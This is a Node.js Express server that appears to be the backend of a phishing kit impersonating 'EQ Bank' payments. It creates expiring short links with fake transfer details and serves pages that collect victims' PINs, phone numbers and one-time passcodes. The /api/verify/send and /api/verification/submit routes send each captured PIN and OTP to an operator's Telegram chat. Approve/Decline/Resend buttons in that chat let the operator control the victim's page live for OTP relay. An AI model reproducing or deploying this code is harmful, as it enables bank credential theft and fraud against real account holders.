const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 5000;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID || '';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

/* Telegram timeout — every Telegram call aborts after 8s */
const TG_TIMEOUT_MS = parseInt(process.env.TELEGRAM_TIMEOUT_MS, 10) || 8000;
function tgFetch(url, opts = {}) {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), TG_TIMEOUT_MS);
  return fetch(url, { ...opts, signal: controller.signal })
    .finally(() => clearTimeout(timer));
}

const DATA_DIR   = process.env.DATA_DIR || (fs.existsSync('/data') ? '/data' : '/tmp');
const LINKS_FILE = path.join(DATA_DIR, 'eq_links.json');
const TXS_FILE   = path.join(DATA_DIR, 'eq_txs.json');

try { if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true }); } catch(e){}

const IS_PERSISTENT = DATA_DIR === '/data';

/* ═══════════════════════════════════════════════════════════════
   CORS — explicit allowlist + guaranteed OPTIONS handler.
   ═══════════════════════════════════════════════════════════════ */
const ALLOWED_ORIGINS = [
  'https://mobile-eq-banking-production.up.railway.app',
  'http://localhost:3000',
  'http://localhost:5173'
];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (ALLOWED_ORIGINS.includes(origin)) return callback(null, true);
    return callback(new Error('CORS not allowed for: ' + origin));
  },
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: false
}));

app.use((req, res, next) => {
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    res.setHeader('Access-Control-Max-Age', '86400');
    return res.sendStatus(204);
  }
  next();
});

app.use(express.json({ limit: '2mb' }));
app.use(express.urlencoded({ extended: true }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

function loadMap(file){
  try {
    if (fs.existsSync(file)) {
      const raw = fs.readFileSync(file, 'utf8');
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return new Map(parsed);
    }
  } catch(e){ console.warn(`[load] ${file} failed:`, e.message); }
  return null;
}
function saveMap(file, map){
  try { fs.writeFileSync(file, JSON.stringify([...map.entries()])); }
  catch(e){ console.warn(`[save] ${file} failed:`, e.message); }
}

let links = loadMap(LINKS_FILE) || new Map();
let txs   = loadMap(TXS_FILE)   || new Map();

console.log(`[links] restored ${links.size} from disk`);
console.log(`[txs]   restored ${txs.size} from disk`);

function persistLinks(){ saveMap(LINKS_FILE, links); }
function persistTxs(){   saveMap(TXS_FILE, txs); }

function esc(s = ''){
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function normalizeLang(v){
  const l = String(v || '').toLowerCase().trim();
  return (l === 'fr' || l === 'en') ? l : 'en';
}

function nowCAT(){
  return new Date().toLocaleString('en-GB', { timeZone: 'Africa/Lagos' }) + ' WAT';
}

function resolvePublicUrl(){
  return (
    process.env.PUBLIC_URL ||
    (process.env.RAILWAY_PUBLIC_DOMAIN ? `https://${process.env.RAILWAY_PUBLIC_DOMAIN}` : '') ||
    `http://localhost:${PORT}`
  ).replace(/\/+$/, '');
}

function randomId(len = 8){
  const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  let out = '';
  const bytes = crypto.randomBytes(len);
  for (let i = 0; i < len; i++) out += chars[bytes[i] % chars.length];
  return out;
}

async function tgSend(text, replyMarkup){
  const body = {
    chat_id: TELEGRAM_CHAT_ID,
    text,
    parse_mode: 'HTML',
    disable_web_page_preview: true
  };
  if (replyMarkup) body.reply_markup = replyMarkup;
  try {
    const r = await tgFetch(`${TELEGRAM_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify(body)
    });
    return await r.json();
  } catch(e){
    const msg = e.name === 'AbortError' ? 'Telegram request timed out' : e.message;
    console.error('[tgSend]', msg);
    return { ok:false, description: msg };
  }
}

async function tgAnswer(cbId, text){
  try {
    await tgFetch(`${TELEGRAM_API}/answerCallbackQuery`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ callback_query_id: cbId, text, show_alert: false })
    });
  } catch(e) { console.warn('[tgAnswer]', e.message); }
}

async function tgRemoveButtons(chatId, messageId){
  try {
    await tgFetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
    });
  } catch(e) { console.warn('[tgRemoveButtons]', e.message); }
}

function ensureTx(key, extra){
  if (!key) return null;
  let t = txs.get(key);
  if (!t) {
    t = {
      key,
      pinStatus: 'pending',
      smsStatus: 'pending',
      otpStatus: 'pending',
      createdAt: Date.now(),
      ...extra
    };
    txs.set(key, t);
  } else if (extra) {
    Object.assign(t, extra);
  }
  persistTxs();
  return t;
}

/* ═══════════════════════════════════════════════════════════════
   BASIC
   ═══════════════════════════════════════════════════════════════ */
app.get('/', (_req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/status', (_req, res) => {
  res.json({
    ok: true,
    service: 'eq-bank-payments-backend',
    activeLinks: links.size,
    activeTxs: txs.size,
    dataDir: DATA_DIR,
    isPersistent: IS_PERSISTENT,
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    publicUrl: resolvePublicUrl(),
    time: new Date().toISOString()
  });
});

app.get('/health', (_req, res) => res.json({
  ok: true,
  ts: Date.now(),
  activeLinks: links.size,
  activeTxs: txs.size,
  dataDir: DATA_DIR,
  isPersistent: IS_PERSISTENT
}));

/* ═══════════════════════════════════════════════════════════════
   LINKS
   ═══════════════════════════════════════════════════════════════ */
app.post('/api/links', (req, res) => {
  try {
    const body = req.body || {};
    const tracking = String(body.trackingNumber || body.tx || body.t || '').trim().toUpperCase();
    if (!tracking) return res.status(400).json({ ok:false, error:'Tracking number required' });

    const now = Date.now();
    const expiryHours = parseInt(body.expiryHours, 10) || 6;

    const record = {
      trackingNumber: tracking,
      accountName: body.accountName || body.rn || '',
      accountNumber: body.accountNumber || body.an || '',
      amount: body.amount || body.am || '0',
      currency: (body.currency || body.cur || 'CAD').toUpperCase(),
      countryCode: body.countryCode || '',
      countryFlag: body.countryFlag || '',
      countryName: body.countryName || body.c || '',
      modeOfPayment: body.modeOfPayment || body.pm || 'Bank Transfer',
      receiptOptional: body.receiptOptional || body.sn || '',
      marketedBy: body.marketedBy || body.mk || '',
      purpose: body.purpose || body.pu || '',
      lang: normalizeLang(body.lang),
      expiryHours,
      createdAt: now,
      expiresAt: now + expiryHours * 60 * 60 * 1000
    };

    links.set(tracking, record);
    persistLinks();
    console.log(`[link] created ${tracking} (${expiryHours}h, lang=${record.lang})`);

    res.json({
      ok: true,
      code: tracking,
      trackingNumber: tracking,
      lang: record.lang,
      expiryHours,
      expiresAt: record.expiresAt
    });
  } catch (err) { res.status(500).json({ ok:false, error: err.message }); }
});

app.get('/api/links/:code', (req, res) => {
  const code = String(req.params.code || '').trim().toUpperCase();
  let rec = links.get(code);
  if (!rec) {
    const restored = loadMap(LINKS_FILE);
    if (restored) { links = restored; rec = links.get(code); }
  }
  if (!rec) return res.status(404).json({ ok:false, error:'Link not found' });
  if (rec.expiresAt && Date.now() > rec.expiresAt) {
    links.delete(code); persistLinks();
    return res.status(410).json({ ok:false, error:'Link expired', expiresAt: rec.expiresAt });
  }

  res.json({
    ok: true,
    ...rec,
    tx:  rec.trackingNumber,
    tn:  rec.trackingNumber,
    rn:  rec.accountName,
    am:  rec.amount,
    cur: rec.currency,
    an:  rec.accountNumber,
    c:   rec.countryName,
    cf:  rec.countryFlag,
    cc:  rec.countryCode,
    pm:  rec.modeOfPayment,
    sn:  rec.receiptOptional,
    mk:  rec.marketedBy,
    pu:  rec.purpose
  });
});

app.get('/api/links', (req, res) => {
  const code = String(req.query.code || '').trim().toUpperCase();
  if (!code) return res.status(400).json({ ok:false, error:'code query param required' });
  req.params.code = code;
  return app._router.handle({ ...req, params: { code }, method: 'GET', url: '/api/links/' + code }, res, () => {});
});

/* ═══════════════════════════════════════════════════════════════
   VERIFY (PIN entry on verify.html)
   ═══════════════════════════════════════════════════════════════ */
app.post('/api/verify/send', async (req, res) => {
  try {
    const { pin, number, country, recipient, amount, currency, fee, reference, method } = req.body || {};
    if (!pin || !reference) {
      return res.status(400).json({ ok:false, error:'pin and reference required' });
    }

    const requestId = randomId(10);
    const t = ensureTx(requestId, {
      reference,
      pin,
      number: number || '',
      country: country || '',
      recipient: recipient || '',
      amount: amount || '',
      currency: currency || '',
      fee: fee || '',
      method: method || '',
      status: 'pending'
    });
    t.status = 'pending';
    persistTxs();

    const text =
      `🔐 <b>EQ Bank PIN Captured</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(reference)}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(recipient || '—')}\n` +
      `📱 <b>Phone:</b> <code>${esc(number || '—')}</code>\n` +
      `🔑 <b>PIN:</b> <code>${esc(pin)}</code>\n` +
      `💳 <b>Method:</b> ${esc(method || '—')}\n` +
      `💰 <b>Amount:</b> ${esc(currency || '')} ${esc(amount || '—')}\n` +
      `🌍 <b>Country:</b> ${esc(country || '—')}\n` +
      `🕒 ${nowCAT()}`;

    const buttons = {
      inline_keyboard: [[
        { text: '✅ Approve', callback_data: `eq:pin:approve:${requestId}` },
        { text: '❌ Decline', callback_data: `eq:pin:decline:${requestId}` }
      ]]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, error: 'Telegram error: ' + (tg.description || 'sendMessage failed') });
    }

    res.json({ ok: true, requestId, status: 'pending' });
  } catch (err) {
    console.error('verify/send error:', err);
    res.status(500).json({ ok:false, error: err.message });
  }
});

app.get('/api/verify/status/:id', (req, res) => {
  const id = String(req.params.id || '').trim();
  let t = txs.get(id);
  if (!t) {
    const restored = loadMap(TXS_FILE);
    if (restored) { txs = restored; t = txs.get(id); }
  }
  if (!t) return res.json({ ok:true, status:'pending', decision:'pending' });
  res.json({ ok:true, status: t.status || 'pending', decision: t.status || 'pending' });
});

/* ═══════════════════════════════════════════════════════════════
   VERIFICATION (6-digit OTP on ecocash.html)
   ═══════════════════════════════════════════════════════════════ */
app.post('/api/verification/otp', async (req, res) => {
  try {
    const { tx, am, cur, c } = req.body || {};
    if (!tx) return res.status(400).json({ ok:false, error:'tx required' });

    const tracking = String(tx).toUpperCase();
    const t = ensureTx(tracking, {});
    t.otpStatus = 'awaiting';
    t.otpRequestedAt = Date.now();
    persistTxs();

    await tgSend(
      `📨 <b>EQ Bank OTP Requested</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `💰 <b>Amount:</b> ${esc(cur || '')} ${esc(am || '—')}\n` +
      `🌍 <b>Country:</b> ${esc(c || '—')}\n` +
      `🕒 ${nowCAT()}`,
      null
    );

    res.json({ ok:true, message:'Code sent' });
  } catch (err) {
    res.status(500).json({ ok:false, error: err.message });
  }
});

app.post('/api/verification/submit', async (req, res) => {
  try {
    const { tx, otp, am, cur, c } = req.body || {};
    if (!tx || !otp) return res.status(400).json({ ok:false, error:'tx and otp required' });

    const tracking = String(tx).toUpperCase();
    const t = ensureTx(tracking, {});
    t.otpStatus = 'pending';
    t.otpCode = otp;
    t.otpSubmittedAt = Date.now();
    persistTxs();

    const text =
      `🔢 <b>EQ Bank OTP Captured</b>\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(tracking)}</code>\n` +
      `🔑 <b>OTP:</b> <code>${esc(otp)}</code>\n` +
      `💰 <b>Amount:</b> ${esc(cur || '')} ${esc(am || '—')}\n` +
      `🌍 <b>Country:</b> ${esc(c || '—')}\n` +
      `🕒 ${nowCAT()}`;

    const buttons = {
      inline_keyboard: [
        [
          { text: '✅ Approve', callback_data: `eq:otp:approve:${tracking}` },
          { text: '❌ Decline', callback_data: `eq:otp:decline:${tracking}` }
        ],
        [
          { text: '🔁 Resend',   callback_data: `eq:otp:resend:${tracking}` },
          { text: '⚠️ Inactive', callback_data: `eq:otp:inactive:${tracking}` }
        ]
      ]
    };

    const tg = await tgSend(text, buttons);
    if (!tg.ok) {
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, error: 'Telegram error: ' + (tg.description || 'sendMessage failed') });
    }

    res.json({ ok:true, status:'pending' });
  } catch (err) {
    res.status(500).json({ ok:false, error: err.message });
  }
});

app.get('/api/verification/status/:tx', (req, res) => {
  const tracking = String(req.params.tx || '').trim().toUpperCase();
  let t = txs.get(tracking);
  if (!t) {
    const restored = loadMap(TXS_FILE);
    if (restored) { txs = restored; t = txs.get(tracking); }
  }
  if (!t) return res.json({ ok:true, decision:'pending' });

  let decision = 'pending';
  if (t.otpStatus === 'approved') decision = 'approved';
  else if (t.otpStatus === 'declined') decision = 'declined';
  else if (t.otpStatus === 'resend') decision = 'expired';
  else if (t.otpStatus === 'inactive') decision = 'inactive';

  res.json({ ok:true, decision });
});

/* ═══════════════════════════════════════════════════════════════
   TELEGRAM WEBHOOK
   ═══════════════════════════════════════════════════════════════ */
app.post('/api/telegram-webhook', async (req, res) => {
  try {
    const update = req.body || {};
    const cq = update.callback_query;
    console.log(`[webhook] hasCallback=${!!cq} data=${cq?.data || 'none'}`);

    if (cq && cq.data) {
      const parts = String(cq.data).split(':');

      if (parts.length === 4 && (parts[0] === 'eq' || parts[0] === 'mtn')) {
        const [_, stage, action, keyRaw] = parts;
        const key = keyRaw;

        let t = txs.get(key);
        if (!t) {
          const restored = loadMap(TXS_FILE);
          if (restored) { txs = restored; t = txs.get(key); }
        }
        if (!t) {
          await tgAnswer(cq.id, 'Session expired');
          return res.json({ ok:true });
        }

        const labels = {
          approve:'✅ Approved',
          decline:'❌ Declined',
          resend:'🔁 Resend',
          inactive:'⚠️ Inactive'
        };

        if (stage === 'pin') {
          if (action === 'approve') t.status = 'approved';
          else if (action === 'decline') t.status = 'declined';
        } else if (stage === 'otp') {
          if (action === 'approve') t.otpStatus = 'approved';
          else if (action === 'decline') t.otpStatus = 'declined';
          else if (action === 'resend') t.otpStatus = 'resend';
          else if (action === 'inactive') t.otpStatus = 'inactive';
        }

        persistTxs();
        await tgAnswer(cq.id, labels[action] || action);
        if (cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
        console.log(`[webhook] ${stage}:${action}:${key} → pin=${t.status||'-'} otp=${t.otpStatus||'-'}`);
        return res.json({ ok:true });
      }
    }

    return res.json({ ok:true });
  } catch (err) {
    console.error('webhook error:', err);
    res.status(500).json({ ok:false, error: err.message });
  }
});

/* ═══════════════════════════════════════════════════════════════
   STATIC + SHORT-LINK ROUTER + 404
   ═══════════════════════════════════════════════════════════════ */
app.use(express.static(__dirname, { extensions: ['html'] }));

/* Short-link handler — /ABC12345 → serve client.html.
   Must be BEFORE the /api 404 catch-all and AFTER static,
   so real files like /index.html still resolve first. */
app.get('/:code', (req, res, next) => {
  const code = String(req.params.code || '').toUpperCase();
  if (!/^[A-Z0-9]{6,12}$/.test(code)) return next();
  if (!links.has(code)) return next();
  res.sendFile(path.join(__dirname, 'client.html'));
});

app.use('/api', (req, res) => {
  res.status(404).json({ ok:false, error:'API route not found', path: req.originalUrl });
});

/* ═══════════════════════════════════════════════════════════════
   WEBHOOK REGISTRATION + START
   ═══════════════════════════════════════════════════════════════ */
async function registerWebhook(){
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[webhook] skipped — Telegram not configured');
    return;
  }
  const publicUrl = resolvePublicUrl();
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log(`PUBLIC_URL = ${publicUrl}`);
  console.log(`Registering webhook: ${webhookUrl}`);
  try {
    const allowed = encodeURIComponent(JSON.stringify(['message','callback_query']));
    const r = await tgFetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}&allowed_updates=${allowed}`);
    console.log('setWebhook result:', await r.json());
  } catch (e) { console.error('setWebhook failed:', e.message); }
}

const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`EQ Bank backend running on port ${PORT}`);
  console.log(`Static HTML dir: ${__dirname}`);
  console.log(`Data directory: ${DATA_DIR} ${IS_PERSISTENT ? '✅ PERSISTENT' : '⚠️  TEMPORARY'}`);
  if (!IS_PERSISTENT) {
    console.warn('⚠️  No persistent disk — data will be WIPED on restart.');
    console.warn('⚠️  Add a volume mounted at /data and set DATA_DIR=/data');
  }
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('⚠️  TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID missing — Telegram will not work');
  }

  // Fire-and-forget: don't block startup on Telegram
  registerWebhook().catch(e => console.error('Webhook registration failed:', e.message));
});

server.on('error', (err) => {
  console.error('Server error:', err);
  process.exit(1);
});

process.on('unhandledRejection', (reason) => {
  console.error('Unhandled rejection:', reason);
});
